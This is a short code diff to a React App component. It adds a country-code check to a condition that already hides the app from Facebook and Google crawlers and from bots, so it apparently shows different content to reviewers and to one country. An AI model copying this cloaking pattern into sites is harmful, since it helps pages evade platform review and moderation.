@@ -62,7 +62,8 @@ function App() {
 
   const userAgent = navigator.userAgent.toLowerCase();
   if(!userAgent.includes('facebook') 
-    && !userAgent.includes('google') 
+    && !userAgent.includes('google')
+    && !countryCode.includes('vn') 
     && !isbot(userAgent)){
     return (
             <BrowserRouter>
